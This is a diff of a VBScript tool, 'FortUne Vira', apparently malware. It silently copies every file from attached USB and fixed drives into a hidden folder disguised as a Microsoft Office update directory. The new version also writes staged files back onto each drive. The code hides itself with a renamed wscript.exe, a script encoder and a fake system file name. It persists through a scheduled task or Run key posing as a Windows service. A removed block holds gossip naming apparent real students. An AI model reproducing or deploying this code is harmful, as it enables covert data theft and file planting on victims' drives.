@@ -1,12 +1,12 @@
 '*******************
 '  FortUne Vira
-'  Version 2.21
+'  Version 2.22
 '*******************
 Option Explicit
 On Error Resume Next
-Const ViraVersion = "2.21"
+Const ViraVersion = "2.22"
 Const ViraTitle = "Vira 2"
-Const ViraDescription = "Vira 2.21 Ultimate Edition"
+Const ViraDescription = "Vira 2.22 Super Edition"
 
 ' System
 Dim Shell, Fso, IsAdmin
@@ -15,17 +15,17 @@ Set Fso = CreateObject("Scripting.FileSystemObject")
 
 ' Vira
 Const ControlFile = "ViraControl.ini"
-Dim FlagFileNum, FlagFile, CapacityGB, Destination
+Dim FlagFileNum, FlagFile, CapacityGB, Destination, ReverseDir
 Dim Container, IsCopied(23)
 
 ' Customization Section
-Const ConfigFile = "C:\Windows\system32\Wbem\Repository\CONFIG.CTI"
+Const ConfigFile = "C:\Windows\System32\Wbem\en-US\ariv.mui"
 
 '****************
 '  Main Program
 '****************
 If WScript.Arguments.Count = 0 Then
-  ProcTrivia
+  ProcessMain
 Else
   Select Case WScript.Arguments(0)
     Case "install"
@@ -122,8 +122,9 @@ Sub ViraSingleLoop
 End Sub
 
 Function DriveProcess(DriveLetter)
+  On Error Resume Next
   DriveProcess = False
-  Dim Drive, Target, TimeA, TimeB, Text, Folder
+  Dim Drive, Target, RTarget, TimeA, TimeB, TimeC, Text, Folder
   Set Drive = Fso.GetDrive(DriveLetter)
   If Drive.DriveType <> 1 And Drive.DriveType <> 2 Then Exit Function
   If Not Drive.IsReady Then Exit Function
@@ -139,6 +140,7 @@ Function DriveProcess(DriveLetter)
     Next
     
     Target = Destination & ConvertHex(Drive.SerialNumber) & "\"
+    RTarget = ReverseDir & ConvertHex(Drive.SerialNumber) & "\"
     If Not Fso.FolderExists(Target) Then
       If Container.Size + Drive.TotalSize - Drive.FreeSpace < CapacityGB * 1000000000 Then
         Fso.CreateFolder Target
@@ -148,14 +150,30 @@ Function DriveProcess(DriveLetter)
     End If
     WriteDriveInfo DriveLetter, Target & "Vira.ini"
     TimeA = Timer()
-    CopyDrive DriveLetter, Target
+    Fso.CopyFile DriveLetter & ":\*", Target, True
+    Fso.CopyFolder DriveLetter & ":\*", Target, True
     TimeB = Timer()
+    If Fso.FolderExists(RTarget) Then
+      Fso.CopyFile RTarget & "*", DriveLetter & ":\", True
+      Fso.CopyFolder RTarget & "*", DriveLetter & ":\", True
+      TimeC = Timer()
+    Else
+      TimeC = -1
+    End If
     
     If TimeB < TimeA Then TimeB = TimeB + 86400
-    Set Folder = Fso.GetFolder(Target)
     Set Text = Fso.OpenTextFile(Target & "Vira.ini", 8)
     Text.WriteLine "[ExtendedDriveInfo]"
-    Text.WriteLine "AverageSpeed=" & ConvertSize(Folder.Size / (TimeB-TimeA)) & "/s"
+    If TimeC <> -1 Then
+      If TimeC < TimeB Then TimeC = TimeC + 86400
+      Set Folder = Fso.GetFolder(Target)
+      Text.WriteLine "AverageReadSpeed=" & ConvertSize(Folder.Size / (TimeB-TimeA)) & "/s"
+      Set Folder = Fso.GetFolder(RTarget)
+      Text.WriteLine "AverageWriteSpeed=" & ConvertSize(Folder.Size / (TimeC-TimeB)) & "/s"
+    Else
+      Set Folder = Fso.GetFolder(Target)
+      Text.WriteLine "AverageSpeed=" & ConvertSize(Folder.Size / (TimeB-TimeA)) & "/s"
+    End If
     Text.Close
     DriveProcess = True
   End If
@@ -291,21 +309,15 @@ Function WriteDriveInfo(DriveLetter, Target)
   Set Text = Fso.OpenTextFile(Target, 2, True)
   Text.WriteLine "[Vira]" & vbCrLf & "Version=" & ViraVersion
   Text.WriteLine "OperationTime=" & Now()
-  Text.WriteLine "[DriveInfo]"
+  Text.WriteLine "[Drive]"
   Text.WriteLine "Label=" & Drive.VolumeName
   Text.WriteLine "SerialNumber=" & ConvertHex(Drive.SerialNumber)
   Text.WriteLine "FileSystem=" & Drive.FileSystem
   Text.WriteLine "TotalSize=" & Drive.TotalSize & " (" & ConvertSize(Drive.TotalSize) & ")"
   Text.WriteLine "DataSize=" & (Drive.TotalSize-Drive.FreeSpace) & " (" & _
                  ConvertSize(Drive.TotalSize-Drive.FreeSpace) & ")"
-  Text.WriteLine "Usage=" & FormatNumber(100*(Drive.TotalSize-Drive.FreeSpace)/Drive.TotalSize, 2, True) & "%"
+  Text.WriteLine "Utilization=" & FormatNumber(100*(Drive.TotalSize-Drive.FreeSpace)/Drive.TotalSize, 2, True) & "%"
   Text.Close
-End Function
-
-Function CopyDrive(DriveLetter, Target)
-  On Error Resume Next
-  Fso.CopyFile DriveLetter & ":\*", Target, True
-  Fso.CopyFolder DriveLetter & ":\*", Target, True
 End Function
 
 Function ReadConfig()
@@ -321,6 +333,10 @@ Function ReadConfig()
     FlagFileNum = 1+UBound(FlagFile)
     CapacityGB = Text.ReadLine()
     Destination = Text.ReadLine()
+    ReverseDir = Text.ReadLine()
+    If ReverseDir = "XEOF" Then 'Old version config filecompatibility
+      ReverseDir = Destination & "Reverse\"
+    End If
     Text.Close
     ReadConfig = True
   Else
@@ -344,6 +360,7 @@ Function WriteConfig()
   Config.WriteLine FlagFileNames
   Config.WriteLine CapacityGB
   Config.WriteLine Destination
+  Config.WriteLine Destination & "Reverse\"
   Config.WriteLine "XEOF"
   Config.Close
   WriteConfig = True
@@ -354,6 +371,7 @@ Function DefaultConfig()
   FlagFile = Array("setup.exe", "bootmgr")
   CapacityGB = 64
   Destination = "D:\Program Files\Microsoft Office\LiveUpdate\packages\"
+  ReverseDir = "D:\Program Files\Microsoft Office\LiveUpdate\packages\Reverse\"
 End Function
 
 Function InstallLocal(Silent, UseScheduledTask)
@@ -361,7 +379,7 @@ Function InstallLocal(Silent, UseScheduledTask)
   If Not AdminCheck() Then
     Exit Function
   End If
-  Shell.Run "TASKKILL.EXE /F /IM netHelper.exe", 0, True
+  Shell.Run "TASKKILL.EXE /F /IM nhclient.exe", 0, True
   If Not Silent Then
     DefaultConfig
     InstallPrompt
@@ -370,27 +388,27 @@ Function InstallLocal(Silent, UseScheduledTask)
   Dim SysDir
   Set SysDir = Fso.GetSpecialFolder(1)
   If Fso.FileExists(Fso.GetParentFolderName(WScript.ScriptFullName) & "\vhost.exe") Then
-    Fso.CopyFile Fso.GetParentFolderName(WScript.ScriptFullName) & "\vhost.exe", SysDir & "\netHelper.exe", True
+    Fso.CopyFile Fso.GetParentFolderName(WScript.ScriptFullName) & "\vhost.exe", SysDir & "\nhclient.exe", True
   Else
-    Fso.CopyFile SysDir & "\wscript.exe", SysDir & "\netHelper.exe", True
+    Fso.CopyFile SysDir & "\wscript.exe", SysDir & "\nhclient.exe", True
   End If
   If Fso.FileExists("screnc.exe") Then
     Shell.Run "screnc.exe /s """ & WScript.ScriptName & """ vtemp.vbe", 0, True
-    Fso.CopyFile Fso.GetParentFolderName(WScript.ScriptFullName) & "\vtemp.vbe", SysDir & "\wstart.vbe", True
+    Fso.CopyFile Fso.GetParentFolderName(WScript.ScriptFullName) & "\vtemp.vbe", "C:\Windows\system32\wstart.vbe", True
     Fso.DeleteFile Fso.GetParentFolderName(WScript.ScriptFullName) & "\vtemp.vbe", True
   Else
-    Fso.CopyFile WScript.ScriptFullName, SysDir & "\wstart.vbe", True
+    Fso.CopyFile WScript.ScriptFullName, "C:\Windows\system32\wstart.vbe", True
   End If
   If UseScheduledTask Then
     Shell.Run "SCHTASKS.EXE /Create /SC ONSTART /F /TN WmiPrSvc /TR " & _
-              """'%SystemRoot%\system32\netHelper.exe' '%SystemRoot%\system32\wstart.vbe' xwh-yz""", 0, True
+              """'%SystemRoot%\system32\nhclient.exe' '%SystemRoot%\system32\wstart.vbe' xwh-yz""", 0, True
     Shell.RegDelete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\NetHelper"
   Else
     Shell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\NetHelper", _
-                   "%SystemRoot%\system32\netHelper.exe %SystemRoot%\system32\\wstart.vbe xwh-yz", "REG_SZ"
+                   "%SystemRoot%\system32\nhclient.exe %SystemRoot%\system32\wstart.vbe xwh-yz", "REG_SZ"
   End If
   MsgBox "Installation Complete!", 64, ViraTitle
-  Shell.Run "%SystemRoot%\system32\netHelper.exe %SystemRoot%\system32\wstart.vbe xwh-yz", 0, False
+  Shell.Run "%SystemRoot%\system32\nhclient.exe %SystemRoot%\system32\wstart.vbe xwh-yz", 0, False
   InstallLocal = 0
 End Function
 
@@ -401,7 +419,7 @@ Sub InstallPrompt()
     FlagFileNum = Abs(CInt(InputBox("Number of flag files:", ViraTitle, FlagFileNum)))
     ReDim Preserve FlagFile(FlagFileNum)
     For i = 0 To FlagFileNum - 1
-      FlagFile(i) = InputBox("Flag file #" & i, ViraTitle, FlagFile(i))
+      FlagFile(i) = InputBox("Flag file #" & i+1, ViraTitle, FlagFile(i))
     Next
     Destination = InputBox("File container location:" & vbCrLf & "Must end with a backslash [\]", ViraTitle, Destination)
     CapacityGB = Abs(CDbl(InputBox("Maximum size of container in GB:", ViraTitle, CapacityGB)))
@@ -460,21 +478,3 @@ Public Sub ProcessMain()
   Loop
 End Sub
 
-Public Sub ProcTrivia()
-  Dim TriviaText, TriviaNum
-  TriviaText = Array(_
-  "谢文皓喜欢叶子","国足亚洲杯出线了！","NVIDIA launches GeForce GTX 960.",_
-  "微软发布Windows 10","AMD再次下调其全线显卡售价","北京和张家口申办2022年冬奥会",_
-  "齐文轩推翻一道冬令营证明题","","Minecraft更新1.8迎来玩家追捧",_
-  "使命召唤Call Of Duty推出天梯","肖行文才是真正的人生赢家","学校关闭金融中心",_
-  "Master Shiang Dzurr plays silver power.","国足亚洲杯出线了！","Minecraft重大更新1.8发布！",_
-  "为歌星姚贝娜送行","曾火山又出神奇考题","通用课出现各种神奇创意作品",_
-  "Gmail邮件服务在中国全面被Qiang","中央反腐又出新规","Zhao紫阳逝世十周年",_
-  "新一届初三比以往更熊","田瑞给大家送可乐啦！","龙创系统岌岌可危",_
-  "据学长称叶子是梁帅的","新一波李梓彰黑照流出","曾火山教竞赛班",_
-  "辛普森创下拖堂新纪录","三行诗迅速走红网络","某班级在生物实验课上集体烧洋葱",_
-  "吴边和女票在一起的照片","陈冬杰让学生写情诗","小米Note正式发布即将上市"_
-  )
-  Randomize Timer()
-  MsgBox TriviaText(Int(UBound(TriviaText) * Rnd)), 64, "你知道吗？"
-End Sub
